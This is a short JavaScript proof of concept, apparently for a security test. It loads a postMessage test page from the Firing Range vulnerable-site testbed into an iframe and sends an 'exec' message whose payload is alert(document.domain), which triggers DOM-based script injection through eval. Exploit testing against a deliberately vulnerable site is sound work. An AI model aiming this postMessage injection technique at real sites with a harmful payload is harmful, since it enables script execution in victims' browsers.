function onClickEvent() {
var target = document.getElementById('target')

target.addEventListener('load', () => {
  
  target.contentWindow.postMessage({"action": "exec", "payload": "alert(document.domain)"}, '*')
})
target.src =
  "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval"
}
